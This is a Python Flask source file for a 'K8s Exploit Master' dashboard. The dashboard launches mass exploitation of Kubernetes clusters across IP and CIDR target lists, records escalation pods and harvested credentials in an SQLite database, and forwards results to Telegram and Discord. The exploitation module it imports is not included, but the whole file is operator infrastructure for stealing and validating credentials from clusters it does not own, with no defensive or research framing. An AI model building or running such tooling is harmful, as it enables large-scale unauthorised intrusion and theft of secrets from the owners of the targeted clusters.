#!/usr/bin/env python3
"""
🚀 K8s Exploit Master - Complete Dashboard Framework
Author: wKayaa
Date: 2025-06-23 23:16:44 UTC

Complete integrated platform with modern dashboard
"""

from flask import Flask, render_template, jsonify, request, send_file, redirect, url_for, flash, session
from flask_socketio import SocketIO, emit
import json
import asyncio
import sqlite3
import threading
import time
import os
import uuid
from datetime import datetime, timedelta
from pathlib import Path
import subprocess
import signal
import psutil
from werkzeug.utils import secure_filename

# Import our K8s exploitation modules
from k8s_exploit_master import K8sExploitMaster, ExploitationResult, CredentialMatch

app = Flask(__name__)
app.config['SECRET_KEY'] = 'k8s-exploit-master-2025'
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max file size

socketio = SocketIO(app, cors_allowed_origins="*")

class ExploitationManager:
    def __init__(self):
        self.db_path = 'exploit_database.db'
        self.active_sessions = {}
        self.running_processes = {}
        self.init_database()
        self.ensure_directories()
        
    def ensure_directories(self):
        """Create necessary directories"""
        os.makedirs('uploads', exist_ok=True)
        os.makedirs('exports', exist_ok=True)
        os.makedirs('logs', exist_ok=True)
        os.makedirs('static/css', exist_ok=True)
        os.makedirs('static/js', exist_ok=True)
        os.makedirs('static/img', exist_ok=True)
        os.makedirs('templates', exist_ok=True)
        
    def init_database(self):
        """Initialize SQLite database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Sessions table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                name TEXT,
                start_time TEXT,
                end_time TEXT,
                status TEXT,
                targets_count INTEGER,
                clusters_scanned INTEGER,
                clusters_exploited INTEGER,
                credentials_found INTEGER,
                credentials_validated INTEGER,
                telegram_token TEXT,
                telegram_chat_id TEXT,
                discord_webhook TEXT,
                created_by TEXT
            )
        ''')
        
        # Targets table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS targets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                target TEXT,
                type TEXT,
                status TEXT,
                discovery_time TEXT,
                FOREIGN KEY (session_id) REFERENCES sessions (id)
            )
        ''')
        
        # Clusters table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS clusters (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                endpoint TEXT,
                status TEXT,
                vulnerable_pods INTEGER,
                escalation_pods TEXT,
                credentials_count INTEGER,
                discovery_time TEXT,
                exploitation_time TEXT,
                FOREIGN KEY (session_id) REFERENCES sessions (id)
            )
        ''')
        
        # Pods table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS pods (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                cluster_endpoint TEXT,
                pod_name TEXT,
                namespace TEXT,
                vulnerabilities TEXT,
                deployment_time TEXT,
                FOREIGN KEY (session_id) REFERENCES sessions (id)
            )
        ''')
        
        # Credentials table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                cluster_endpoint TEXT,
                type TEXT,
                value TEXT,
                file_path TEXT,
                confidence REAL,
                validated BOOLEAN,
                validation_result TEXT,
                extraction_time TEXT,
                FOREIGN KEY (session_id) REFERENCES sessions (id)
            )
        ''')
        
        # Logs table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                timestamp TEXT,
                level TEXT,
                message TEXT,
                component TEXT,
                FOREIGN KEY (session_id) REFERENCES sessions (id)
            )
        ''')
        
        # Settings table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT,
                description TEXT,
                updated_at TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def get_dashboard_stats(self):
        """Get comprehensive dashboard statistics"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Basic counts
        cursor.execute('SELECT COUNT(*) FROM sessions')
        total_sessions = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM clusters')
        total_clusters = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM credentials WHERE validated = 1')
        validated_credentials = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM clusters WHERE status = "exploited"')
        exploited_clusters = cursor.fetchone()[0]
        
        # Recent activity (last 24 hours)
        twenty_four_hours_ago = (datetime.now() - timedelta(hours=24)).isoformat()
        cursor.execute('SELECT COUNT(*) FROM sessions WHERE start_time > ?', (twenty_four_hours_ago,))
        recent_sessions = cursor.fetchone()[0]
        
        # Active sessions
        cursor.execute('SELECT COUNT(*) FROM sessions WHERE status = "running"')
        active_sessions = cursor.fetchone()[0]
        
        # Hourly activity data for chart (last 24 hours)
        activity_data = []
        labels = []
        for i in range(24):
            hour_start = (datetime.now() - timedelta(hours=i+1)).isoformat()
            hour_end = (datetime.now() - timedelta(hours=i)).isoformat()
            cursor.execute('''
                SELECT COUNT(*) FROM credentials 
                WHERE extraction_time BETWEEN ? AND ?
            ''', (hour_start, hour_end))
            count = cursor.fetchone()[0]
            activity_data.append(count)
            labels.append(f"{23-i}h")
        
        activity_data.reverse()
        labels.reverse()
        
        # Credential types breakdown
        cursor.execute('''
            SELECT type, COUNT(*) FROM credentials 
            WHERE validated = 1 
            GROUP BY type
        ''')
        credential_types = dict(cursor.fetchall())
        
        # Recent sessions for timeline
        cursor.execute('''
            SELECT id, name, start_time, status, clusters_scanned, credentials_validated
            FROM sessions 
            ORDER BY start_time DESC 
            LIMIT 10
        ''')
        recent_sessions_data = cursor.fetchall()
        
        # Top targets by exploitation success
        cursor.execute('''
            SELECT t.target, COUNT(c.id) as cluster_count, 
                   SUM(CASE WHEN c.status = "exploited" THEN 1 ELSE 0 END) as exploited_count
            FROM targets t
            LEFT JOIN clusters c ON t.session_id = c.session_id
            GROUP BY t.target
            ORDER BY exploited_count DESC
            LIMIT 5
        ''')
        top_targets = cursor.fetchall()
        
        conn.close()
        
        return {
            'total_sessions': total_sessions,
            'total_clusters': total_clusters,
            'validated_credentials': validated_credentials,
            'exploited_clusters': exploited_clusters,
            'recent_sessions': recent_sessions,
            'active_sessions': active_sessions,
            'activity_data': activity_data,
            'activity_labels': labels,
            'credential_types': credential_types,
            'recent_sessions_data': recent_sessions_data,
            'top_targets': top_targets
        }
    
    def create_session(self, name, targets, telegram_token=None, telegram_chat_id=None, discord_webhook=None):
        """Create new exploitation session"""
        session_id = str(uuid.uuid4())[:8]
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Insert session
        cursor.execute('''
            INSERT INTO sessions 
            (id, name, start_time, status, targets_count, clusters_scanned, 
             clusters_exploited, credentials_found, credentials_validated,
             telegram_token, telegram_chat_id, discord_webhook, created_by)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            session_id, name, datetime.now().isoformat(), 'created', 
            len(targets), 0, 0, 0, 0,
            telegram_token, telegram_chat_id, discord_webhook, 'wKayaa'
        ))
        
        # Insert targets
        for target in targets:
            target_type = 'cidr' if '/' in target else 'ip'
            cursor.execute('''
                INSERT INTO targets (session_id, target, type, status, discovery_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (session_id, target, target_type, 'pending', datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
        
        return session_id
    
    def start_exploitation(self, session_id):
        """Start exploitation session in background"""
        if session_id in self.active_sessions:
            return False, "Session already running"
        
        # Get session details
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT telegram_token, telegram_chat_id, discord_webhook 
            FROM sessions WHERE id = ?
        ''', (session_id,))
        session_data = cursor.fetchone()
        
        cursor.execute('SELECT target FROM targets WHERE session_id = ?', (session_id,))
        targets = [row[0] for row in cursor.fetchall()]
        conn.close()
        
        if not session_data:
            return False, "Session not found"
        
        # Update session status
        self.update_session_status(session_id, 'running')
        
        # Start exploitation in background thread
        def run_exploitation():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                
                exploit_master = K8sExploitMaster(
                    telegram_token=session_data[0],
                    telegram_chat_id=session_data[1],
                    discord_webhook=session_data[2]
                )
                
                self.active_sessions[session_id] = exploit_master
                
                # Run exploitation
                results = loop.run_until_complete(
                    exploit_master.run_mass_exploitation(targets)
                )
                
                # Save results
                self.save_exploitation_results(session_id, exploit_master, results)
                self.update_session_status(session_id, 'completed')
                
                # Emit completion event
                socketio.emit('session_completed', {
                    'session_id': session_id,
                    'results_count': len(results)
                })
                
            except Exception as e:
                self.log_message(session_id, 'error', f"Exploitation failed: {str(e)}", 'exploitation')
                self.update_session_status(session_id, 'failed')
                socketio.emit('session_failed', {
                    'session_id': session_id,
                    'error': str(e)
                })
            finally:
                if session_id in self.active_sessions:
                    del self.active_sessions[session_id]
        
        thread = threading.Thread(target=run_exploitation)
        thread.daemon = True
        thread.start()
        
        return True, "Exploitation started"
    
    def stop_exploitation(self, session_id):
        """Stop running exploitation session"""
        if session_id in self.active_sessions:
            # Gracefully stop the session
            self.update_session_status(session_id, 'stopped')
            del self.active_sessions[session_id]
            return True, "Session stopped"
        return False, "Session not running"
    
    def update_session_status(self, session_id, status):
        """Update session status"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        end_time = None
        if status in ['completed', 'failed', 'stopped']:
            end_time = datetime.now().isoformat()
        
        if end_time:
            cursor.execute('''
                UPDATE sessions SET status = ?, end_time = ? WHERE id = ?
            ''', (status, end_time, session_id))
        else:
            cursor.execute('''
                UPDATE sessions SET status = ? WHERE id = ?
            ''', (status, session_id))
        
        conn.commit()
        conn.close()
    
    def save_exploitation_results(self, session_id, exploit_master, results):
        """Save exploitation results to database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Update session stats
        cursor.execute('''
            UPDATE sessions SET 
            clusters_scanned = ?, clusters_exploited = ?, 
            credentials_found = ?, credentials_validated = ?
            WHERE id = ?
        ''', (
            exploit_master.stats['clusters_scanned'],
            exploit_master.stats['clusters_exploited'],
            exploit_master.stats['credentials_found'],
            exploit_master.stats['credentials_validated'],
            session_id
        ))
        
        # Save clusters and credentials
        for result in results:
            # Save cluster
            cursor.execute('''
                INSERT INTO clusters 
                (session_id, endpoint, status, vulnerable_pods, escalation_pods, 
                 credentials_count, discovery_time, exploitation_time)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                session_id, result.cluster_endpoint, result.status,
                len(result.vulnerable_pods), ','.join(result.escalation_pods),
                len(result.credentials_found), datetime.now().isoformat(),
                datetime.now().isoformat()
            ))
            
            # Save vulnerable pods
            for pod in result.vulnerable_pods:
                cursor.execute('''
                    INSERT INTO pods 
                    (session_id, cluster_endpoint, pod_name, namespace, 
                     vulnerabilities, deployment_time)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (
                    session_id, result.cluster_endpoint, pod['name'],
                    pod['namespace'], ','.join(pod['vulnerabilities']),
                    datetime.now().isoformat()
                ))
            
            # Save credentials
            for cred in result.credentials_found:
                cursor.execute('''
                    INSERT INTO credentials 
                    (session_id, cluster_endpoint, type, value, file_path, 
                     confidence, validated, validation_result, extraction_time)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    session_id, result.cluster_endpoint, cred.type,
                    cred.value[:100] + '...' if len(cred.value) > 100 else cred.value,
                    cred.file_path, cred.confidence, cred.validated,
                    json.dumps(cred.validation_result), cred.extraction_time
                ))
        
        conn.commit()
        conn.close()
    
    def log_message(self, session_id, level, message, component='system'):
        """Log message to database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO logs (session_id, timestamp, level, message, component)
            VALUES (?, ?, ?, ?, ?)
        ''', (session_id, datetime.now().isoformat(), level, message, component))
        
        conn.commit()
        conn.close()
        
        # Emit to connected clients
        socketio.emit('new_log', {
            'session_id': session_id,
            'timestamp': datetime.now().isoformat(),
            'level': level,
            'message': message,
            'component': component
        })
    
    def get_session_details(self, session_id):
        """Get detailed session information"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Session info
        cursor.execute('SELECT * FROM sessions WHERE id = ?', (session_id,))
        session = cursor.fetchone()
        
        # Targets
        cursor.execute('SELECT * FROM targets WHERE session_id = ?', (session_id,))
        targets = cursor.fetchall()
        
        # Clusters
        cursor.execute('SELECT * FROM clusters WHERE session_id = ?', (session_id,))
        clusters = cursor.fetchall()
        
        # Credentials
        cursor.execute('SELECT * FROM credentials WHERE session_id = ?', (session_id,))
        credentials = cursor.fetchall()
        
        # Logs
        cursor.execute('SELECT * FROM logs WHERE session_id = ? ORDER BY timestamp DESC LIMIT 100', (session_id,))
        logs = cursor.fetchall()
        
        conn.close()
        
        return {
            'session': session,
            'targets': targets,
            'clusters': clusters,
            'credentials': credentials,
            'logs': logs
        }
    
    def export_session_data(self, session_id, format='json'):
        """Export session data in various formats"""
        details = self.get_session_details(session_id)
        
        if format == 'json':
            export_data = {
                'session_id': session_id,
                'export_time': datetime.now().isoformat(),
                'session_info': dict(zip([
                    'id', 'name', 'start_time', 'end_time', 'status', 'targets_count',
                    'clusters_scanned', 'clusters_exploited', 'credentials_found',
                    'credentials_validated', 'telegram_token', 'telegram_chat_id',
                    'discord_webhook', 'created_by'
                ], details['session'])) if details['session'] else {},
                'targets': [dict(zip([
                    'id', 'session_id', 'target', 'type', 'status', 'discovery_time'
                ], target)) for target in details['targets']],
                'clusters': [dict(zip([
                    'id', 'session_id', 'endpoint', 'status', 'vulnerable_pods',
                    'escalation_pods', 'credentials_count', 'discovery_time', 'exploitation_time'
                ], cluster)) for cluster in details['clusters']],
                'credentials': [dict(zip([
                    'id', 'session_id', 'cluster_endpoint', 'type', 'value',
                    'file_path', 'confidence', 'validated', 'validation_result', 'extraction_time'
                ], cred)) for cred in details['credentials']],
                'logs': [dict(zip([
                    'id', 'session_id', 'timestamp', 'level', 'message', 'component'
                ], log)) for log in details['logs']]
            }
            
            filename = f"exports/session_{session_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(export_data, f, indent=2, ensure_ascii=False)
            
            return filename
        
        return None

# Global manager instance
manager = ExploitationManager()

# Routes
@app.route('/')
def dashboard():
    """Main dashboard page"""
    stats = manager.get_dashboard_stats()
    return render_template('dashboard.html', stats=stats)

@app.route('/sessions')
def sessions():
    """Sessions management page"""
    conn = sqlite3.connect(manager.db_path)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT id, name, start_time, end_time, status, targets_count,
               clusters_scanned, clusters_exploited, credentials_validated
        FROM sessions ORDER BY start_time DESC
    ''')
    sessions_data = cursor.fetchall()
    conn.close()
    
    return render_template('sessions.html', sessions=sessions_data)

@app.route('/session/<session_id>')
def session_details(session_id):
    """Session details page"""
    details = manager.get_session_details(session_id)
    return render_template('session_details.html', session_id=session_id, details=details)

@app.route('/scanner')
def scanner():
    """Network scanner page"""
    return render_template('scanner.html')

@app.route('/credentials')
def credentials():
    """Credentials management page"""
    conn = sqlite3.connect(manager.db_path)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT c.*, s.name as session_name
        FROM credentials c
        LEFT JOIN sessions s ON c.session_id = s.id
        WHERE c.validated = 1
        ORDER BY c.extraction_time DESC
    ''')
    credentials_data = cursor.fetchall()
    conn.close()
    
    return render_template('credentials.html', credentials=credentials_data)

@app.route('/logs')
def logs():
    """System logs page"""
    conn = sqlite3.connect(manager.db_path)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT l.*, s.name as session_name
        FROM logs l
        LEFT JOIN sessions s ON l.session_id = s.id
        ORDER BY l.timestamp DESC
        LIMIT 1000
    ''')
    logs_data = cursor.fetchall()
    conn.close()
    
    return render_template('logs.html', logs=logs_data)

@app.route('/settings')
def settings():
    """Settings page"""
    return render_template('settings.html')

# API Routes
@app.route('/api/stats')
def api_stats():
    """Get dashboard statistics"""
    stats = manager.get_dashboard_stats()
    return jsonify(stats)

@app.route('/api/create_session', methods=['POST'])
def api_create_session():
    """Create new exploitation session"""
    data = request.json
    
    name = data.get('name', f"Session {datetime.now().strftime('%Y%m%d_%H%M%S')}")
    targets = data.get('targets', [])
    telegram_token = data.get('telegram_token')
    telegram_chat_id = data.get('telegram_chat_id')
    discord_webhook = data.get('discord_webhook')
    
    if not targets:
        return jsonify({'error': 'No targets provided'}), 400
    
    session_id = manager.create_session(
        name, targets, telegram_token, telegram_chat_id, discord_webhook
    )
    
    return jsonify({
        'success': True,
        'session_id': session_id,
        'message': 'Session created successfully'
    })

@app.route('/api/start_session/<session_id>', methods=['POST'])
def api_start_session(session_id):
    """Start exploitation session"""
    success, message = manager.start_exploitation(session_id)
    
    if success:
        return jsonify({'success': True, 'message': message})
    else:
        return jsonify({'error': message}), 400

@app.route('/api/stop_session/<session_id>', methods=['POST'])
def api_stop_session(session_id):
    """Stop exploitation session"""
    success, message = manager.stop_exploitation(session_id)
    
    if success:
        return jsonify({'success': True, 'message': message})
    else:
        return jsonify({'error': message}), 400

@app.route('/api/session/<session_id>')
def api_session_details(session_id):
    """Get session details"""
    details = manager.get_session_details(session_id)
    return jsonify(details)

@app.route('/api/export/<session_id>')
def api_export_session(session_id):
    """Export session data"""
    format_type = request.args.get('format', 'json')
    filename = manager.export_session_data(session_id, format_type)
    
    if filename:
        return send_file(filename, as_attachment=True)
    else:
        return jsonify({'error': 'Export failed'}), 500

@app.route('/api/active_sessions')
def api_active_sessions():
    """Get active sessions"""
    active = []
    for session_id, exploit_master in manager.active_sessions.items():
        active.append({
            'session_id': session_id,
            'stats': exploit_master.stats,
            'start_time': exploit_master.start_time.isoformat()
        })
    
    return jsonify(active)

# WebSocket events
@socketio.on('connect')
def handle_connect():
    print(f"Client connected: {request.sid}")
    emit('connected', {'status': 'Connected to K8s Exploit Master'})

@socketio.on('disconnect')
def handle_disconnect():
    print(f"Client disconnected: {request.sid}")

@socketio.on('join_session')
def handle_join_session(data):
    session_id = data['session_id']
    # Join room for session-specific updates
    # Implementation for real-time session monitoring

if __name__ == '__main__':
    # Create template files if they don't exist
    template_dir = Path('templates')
    template_dir.mkdir(exist_ok=True)
    
    # Create static files if they don't exist
    static_dir = Path('static')
    static_dir.mkdir(exist_ok=True)
    (static_dir / 'css').mkdir(exist_ok=True)
    (static_dir / 'js').mkdir(exist_ok=True)
    
    print("🚀 K8s Exploit Master Dashboard starting...")
    print("📊 Dashboard: http://localhost:5000")
    print("🔧 Framework ready for exploitation!")
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)